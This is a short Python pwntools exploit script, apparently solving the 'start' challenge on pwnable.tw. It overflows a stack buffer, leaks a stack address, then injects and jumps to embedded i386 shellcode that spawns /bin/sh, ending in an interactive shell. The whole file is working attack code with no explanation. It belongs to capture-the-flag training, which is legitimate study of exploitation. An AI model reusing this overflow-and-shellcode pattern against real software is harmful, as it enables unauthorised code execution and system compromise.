#!/usr/bin/env python

from pwn import *

r = process('./start')
# r = remote('chall.pwnable.tw', 10000)

context.arch = 'i386'

shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

raw_input("$")
r.recvuntil(':')
r.send('a' * 0x14 + p32(0x08048087))
ret = u32(r.recv()[:4]) + 0x14
log.info(hex(ret))


r.send('a' * 0x14 + p32(ret) + shellcode)

r.interactive()
